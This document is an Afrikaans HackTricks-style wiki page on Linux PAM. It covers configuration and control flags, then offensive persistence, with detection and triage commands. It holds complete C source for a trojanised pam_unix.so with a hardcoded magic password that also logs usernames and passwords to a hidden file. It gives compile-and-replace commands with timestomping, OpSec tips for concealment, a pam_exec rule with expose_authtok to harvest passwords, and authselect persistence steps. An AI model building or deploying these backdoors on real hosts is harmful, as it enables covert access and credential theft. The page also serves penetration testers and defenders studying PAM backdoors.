# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Basiese inligting

**PAM (Pluggable Authentication Modules)** dien as ’n sekuriteitsmeganisme wat **die identiteit verifieer van gebruikers wat toegang tot rekenaardienste probeer verkry**, en hul toegang op grond van verskeie kriteria beheer. Dit is soortgelyk aan ’n digitale hekwagter wat verseker dat slegs gemagtigde gebruikers spesifieke dienste kan gebruik, terwyl hul gebruik moontlik beperk word om te voorkom dat die stelsel oorlaai word.

#### Konfigurasielêers

- **Solaris** ondersteun die verouderde sentrale lêer `/etc/pam.conf`, maar huidige riglyne beveel dienslêers onder `/etc/pam.d` aan.<sup>[[10]](#references)</sup>
- **Linux-stelsels** verkies ’n gidsbenadering en stoor diensspesifieke konfigurasies binne `/etc/pam.d`. Die konfigurasielêer vir die login-diens is byvoorbeeld in `/etc/pam.d/login` te vinde.<sup>[[1]](#references)</sup>

’n Voorbeeld van ’n PAM-konfigurasie vir die login-diens kan soos volg lyk:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM-bestuursdomeine**

Hierdie domeine, of bestuursgroepe, sluit **auth**, **account**, **password** en **session** in. Elkeen is verantwoordelik vir verskillende aspekte van die verifikasie- en sessiebestuursproses:<sup>[[1]](#references)</sup>

- **Auth**: Bevestig gebruikeridentiteit, dikwels deur vir ’n wagwoord te vra.
- **Account**: Hanteer rekeningverifikasie en kontroleer voorwaardes soos groeplidmaatskap of tydsbeperkings.
- **Password**: Bestuur wagwoordbywerkings, insluitend kompleksiteitskontroles en voorkoming van woordebo aanvalle.
- **Session**: Bestuur handelinge wanneer ’n dienssessie begin of eindig, soos om gidse te monteer of hulpbronlimiete in te stel.

#### **PAM-modulekontroles**

Kontroles bepaal hoe die module op sukses of mislukking reageer en beïnvloed die algehele verifikasieproses. Dit sluit die volgende in:<sup>[[1]](#references)</sup>

- **Required**: ’n Vereiste module se mislukking lei uiteindelik tot mislukking, maar eers nadat alle daaropvolgende modules nagegaan is.
- **Requisite**: Beëindig die proses onmiddellik wanneer dit misluk.
- **Sufficient**: As geen vroeëre `required`-module misluk het nie, keer sukses onmiddellik terug en slaan die oorblywende modules in dieselfde bestuursgroep oor.
- **Optional**: Veroorsaak slegs mislukking as dit die enigste module in die stapel is.

#### Aanvallende semantiek wat saak maak

Wanneer jy PAM ontleed of wysig, bepaal die **ligging van ’n ingevoegde reël** watter stapel dit sien:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` en `substack` haal reëls uit ander lêers. Die wysiging van `sshd` kan dus net SSH raak, terwyl die wysiging van `system-auth`, `common-auth` of ’n ander gedeelde stapel verskeie dienste tegelyk kan raak.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM ondersteun ook beheerinstellings tussen vierkantige hakies, soos `[success=1 default=ignore]`. Dit kan misbruik word om **een of meer modules oor te slaan** ná ’n suksesvolle pasgemaakte kontrole, eerder as om `pam_unix.so` sigbaar te vervang.<sup>[[1]](#references)</sup>
- Die `module-path` kan **absoluut** wees (`/usr/lib/security/pam_custom.so`) of **relatief** tot die verstek-PAM-modulegids. Op moderne Linux-stelsels is die werklike gidse dikwels `/lib/security`, `/lib64/security`, `/usr/lib/security` of multiarch-paaie soos `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Kort operateurwenk: karteer altyd die **volledige diensgrafiek** voordat jy iets regmaak. Byvoorbeeld, `sshd -> password-auth -> system-auth` op sommige distros, of `sshd -> system-remote-login -> system-login -> system-auth` op ander, beteken dat dieselfde implantaat van een reël baie wyer kan versprei as wat bedoel is.<sup>[[1]](#references)[[13]](#references)</sup>

’n Pasgemaakte `auth`-module kan ná die rekeningwagwoord ’n interaktiewe uitdaging by `sudo` voeg. Inspekteer die effektiewe `/etc/pam.d/sudo`-stapel, ingeslote beleid, module-argumente en toestemmings op enige plaaslike datalêer waarna verwys word voordat jy die uitdaging handmatig nagaan. ’n Leesbare lys uitdagingswoorde omseil nie die wagwoordkontrole of skep ’n sudoers-toekenning nie. ’n Bevoorregte oorgang vereis steeds die korrekte rekeningverifikasie, die voltooiing van elke vereiste PAM-stap en ’n sudo-reël wat as root kan optree; outomatiese enumerasie behoort nie die uitdaging te aktiveer nie.

Vir die ou Ubuntu-[`pam_motd`-eienaarskapfout (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832), gaan die werklike `libpam-modules`-bou na en bepaal of ’n aanmeldingsdiens die geaffekteerde sessiemodule aanroep. Ubuntu het dit reggestel in **1.1.0-2ubuntu1.1** vir 9.10 en **1.1.1-2ubuntu5** vir 10.04 LTS; ander vrystellings of teruggeporteerde regstellings van verskaffers vereis ’n afsonderlike pakketbeoordeling. Die gerapporteerde pad het vereis dat die oproeper hul tuisgids se `.cache` met ’n simboliese skakel vervang en daarna ’n PAM-aanmelding aktiveer, wat veroorsaak het dat die ou module ’n beskermde teiken se eienaarskap verander. ’n `.cache`-inskrywing, `pam_motd.so`-reël of ou kernweergawe bewys op sigself nie dat die stelsel blootgestel is nie; kontroleer beheer oor die tuisgids, die effektiewe moduleweergawe, aanmeldingsbereikbaarheid, hantering van simboliese skakels en teikentoestemmings sonder om lêers te vervang of ’n aanmelding tydens passiewe enumerasie te begin. Sien [Ubuntu se sekuriteitskennisgewing](https://ubuntu.com/security/notices/USN-959-1).

#### Voorbeeldscenario

In ’n opstelling met verskeie auth-modules volg die proses ’n streng volgorde. As die `pam_securetty`-module vasstel dat die aanmeldterminaal nie gemagtig is nie, word root-aanmeldings geblokkeer, maar alle modules word steeds verwerk weens die module se "required"-status. Die `pam_env`-module stel omgewingsveranderlikes in, wat moontlik die gebruikerservaring verbeter. Die `pam_ldap`- en `pam_unix`-modules werk saam om die gebruiker te verifieer; `pam_unix` probeer ’n voorheen verskafte wagwoord gebruik, wat die verifikasiemetodes doeltreffender en buigsamer maak.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` in ’n diensstapel

`pam_permit.so` lewer sukses vir PAM-kontroles. As ’n gebruiker met laer voorregte ’n diens se effektiewe PAM-beleid kan wysig, kan die invoeging daarvan met ’n beheervlag wat die verifikasiestapel kortsluit, die wagwoordkontrole vir daardie diens verwyder. Vir `sudo`, inspekteer `/etc/pam.d/sudo` en enige ingeslote `common-auth`- of `system-auth`-lêer voordat jy besluit watter dienste geraak word. ’n PAM-verifikasi-omseiling **verleen nie** ’n nuwe sudoers-reël nie; die gebruiker moet steeds gemagtig wees om die aangevraagde opdrag uit te voer. Gaan die reëlvolgorde en enige vroeëre `required`-mislukkings na eerder as om aan te neem dat ’n enkele `sufficient pam_permit.so`-reël altyd slaag.

## Backdooring PAM – Hooking `pam_unix.so`

’n Klassieke volhardingstruuk in Linux-omgewings met hoë waarde is om **die wettige PAM-biblioteek met ’n getrojaniseerde drop-in te vervang**. Op ’n gasheer waarvan die PAM-stapel `pam_unix.so` laai, kan SSH- of konsoleverifikasie die `pam_sm_authenticate()`-ingangspunt aanroep; ’n kwaadwillige plaasvervanger kan geloofsbriewe vaslê of ’n *magic*-wagwoordomseiling implementeer.<sup>[[2]](#references)[[11]](#references)</sup>

### Samestellingswenkblad
Die skets hieronder gebruik Linux-PAM se `pam_sm_authenticate()`-diensingangspunt en `pam_get_authtok()` om toegang tot die verifikasietoken te verkry.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Voorbeeld van ’n `pam_unix.so`-Trojan</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Kompileer en vervang ongemerk (die vervangings-/timestomp-patroon word deur Unit 42 gedokumenteer). Pas die rugsteunpad wat in die wrapper hardgekodeer is, asook die opdragte hieronder, aan by die teiken se werklike PAM-modulegids:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec-wenke
1. **Atomiese oorskryf** – skryf ’n volledige biblioteek na ’n tydelike lêer en hernoem dit na die korrekte plek om te voorkom dat ’n gedeeltelik geskryfde verifikasiemodule agterbly.
2. ’n Pad soos `/usr/bin/.dbus.log` is in Unit 42 se AuthDoor-ontleding waargeneem, en is dus ook ’n nuttige aanduiding om na te soek.<sup>[[2]](#references)</sup>
3. Behou die toegangspunte wat die PAM-stapel verwag (byvoorbeeld `pam_sm_authenticate` en `pam_sm_setcred`) sodat ander bestuursbewerkings kan voortgaan om te werk.<sup>[[11]](#references)[[18]](#references)</sup>

### Opsporing
Vir pakketintegriteitskontroles verifieer RPM die metadata van geïnstalleerde lêers, rapporteer `debsums -s` kontrolesomfoute, en soek `dpkg -S` in die triage-blok na pakket-eienaarskap; die sintaksis vir audit watch teken skryfbewerkings en kenmerkveranderings aan ’n pad aan.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Vergelyk die MD5/SHA256 van `pam_unix.so` met dié van die distro-pakket.
* Gebruik `rpm -V pam` of `debsums -s libpam-modules` om vervangde biblioteke raak te sien sonder handmatige hashing.
* Kyk vir wêreldskryfbare lêers of ongewone eienaarskap onder `/lib/security/`.
* `auditd`-reël: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Soek in PAM-konfigurasies na onverwagte modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Daardie `pam_`-grep mis pasgemaakte modules met ander `.so`-basisname. Gaan die **aktiewe** `auth`-, `account`-, `password`- en `session`-reëls in `/etc/pam.d` na (en `/etc/pam.conf` waar dit gebruik word), insluitend hul beheervlag en enige ingeslote stapel. ’n Onbekende module wat as `auth sufficient` voor die normale wagwoordkontrole geplaas is, verdien ’n ondersoek na pakket-eienaarskap en die binêre lêer; [PAM se beheersintaksis](https://man7.org/linux/man-pages/man5/pam.d.5.html) kan veroorsaak dat sukses daardie deel van die stapel vroegtydig beëindig. ’n Modulenaam, ongewone tydstempel of `nodelay`-opsie bewys op sigself nie ’n omseiling nie. As gedrag op ’n tydsberekeningslek dui, ondersoek eers die implementering en die diens se bereikbaarheid; roetine-opnoeming behoort nie herhaaldelik verifikasiepogings in te dien nie.

### Vinnige triage-opdragte (ná ’n kompromittering of tydens bedreigingsjag)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Misbruik van `pam_exec` vir persistence
In plaas daarvan om `pam_unix.so` te vervang, is ’n minder ingrypende benadering om ’n `pam_exec`-reël by `/etc/pam.d/sshd` te voeg, sodat ’n aanroep wat daardie PAM-reël bereik, ’n helper laat loop terwyl die normale stapel ongeskonde bly.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` ontvang PAM-metadata in omgewingsveranderlikes soos `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` en `PAM_TYPE`. Met `expose_authtok` kan die helper tot `PAM_MAX_RESP_SIZE` grepe van die wagwoord vanaf `stdin` lees tydens die `auth`- of `password`-fases. As jy wil hê die helper moet met die effektiewe UID in plaas van die werklike UID loop, voeg `seteuid` by.<sup>[[4]](#references)</sup>

Praktiese notas volg die module-tipes en `type=`-filter wat vir `pam_exec` gedokumenteer is:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` is beter vir **aksies ná aanmelding**, soos om sokkels te heropen of ’n ontkoppelde daemon te begin.
- `auth optional pam_exec.so quiet expose_authtok ...` is die gewone keuse vir **insameling van geloofsbriewe**, omdat dit loop voordat die sessie begin.
- `type=session` of `type=auth` kan gebruik word om uitvoering tot ’n spesifieke PAM-fase te beperk en onnodige dubbele uitvoering te vermy.

Vir ’n voorregtehersiening is ’n absolute `pam_exec.so`-helperpad waarop die huidige gebruiker kan skryf ’n kandidaat, selfs wanneer die lêer as slegs-byvoegbaar (`a`) gemerk is: [die kenmerk laat byvoeging toe](https://man7.org/linux/man-pages/man1/chattr.1.html), wat genoeg kan wees om ’n dopskrip se latere gedrag te verander. Bevestig eers dat die PAM-diens en gebeurtenis daardie reël bereik, dat die helper en sy ouerpad vertrou kan word, en dat die opdrag onder ’n meer bevoorregte identiteit loop; [`seteuid` verander watter PAM-UID gebruik word](https://man7.org/linux/man-pages/man8/pam_exec.8.html). ’n Skryfbare lêer of `lsattr`-resultaat alleen bewys nie bevoorregte uitvoering nie.

### Oorlewing van distro-gereedskap: `authselect`

Op RHEL- en Fedora-familiestelsels wat `authselect` gebruik, kan direkte wysigings aan gegenereerde lêers soos `/etc/pam.d/system-auth` of `/etc/pam.d/password-auth` **deur `authselect` oorskryf word**. Vir volharding wysig operateurs dikwels die aktiewe pasgemaakte profiel onder `/etc/authselect/custom/<profile>/` en kies dit dan weer.<sup>[[5]](#references)[[19]](#references)</sup>

Tipiese werkvloei wanneer jy root het:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Dit is belangrik vir sowel aanvalle as triage: as `/etc/pam.d/system-auth` die banier `Generated by authselect` en `Do not modify this file manually` bevat, kan die werklike volhardingspunt eerder onder `/etc/authselect/custom/` as onder `/etc/pam.d/` wees.<sup>[[5]](#references)</sup>

### Onlangse tradecraft wat in die wild waargeneem is

Onlangse beriggewing uit 2025 oor die **Plague** Linux-backdoor het getoon hoe dieselfde kernidee verder gevoer is: ’n kwaadwillige PAM-komponent met ’n **statiese omseilwagwoord**, plus die skoonmaak van SSH-verwante omgewingsveranderlikes en shell-geskiedenis (`HISTFILE=/dev/null`) om sessiespore ná aanmelding te verminder.<sup>[[3]](#references)</sup> Dit is ’n nuttige jagpatroon, omdat die backdoor-logika in PAM kan wees terwyl die stealth-artefakte eers **ná** suksesvolle verifikasie verskyn.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Die geheime operateur se speelboek: infiltrasie van globale telekommunikasienetwerke - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: ’n nuut ontdekte PAM-gebaseerde backdoor vir Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Konfigurasie van gebruikersverifikasie met authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian-handleidingbladsye](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian-handleidingbladsye](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Bestuur van verifikasie in Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Stelselvlak-verifikasiegids - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu-pakketlêerlys: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian-handleidingbladsye](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM-handleiding](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Veranderings: Maak Authselect verpligtend - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
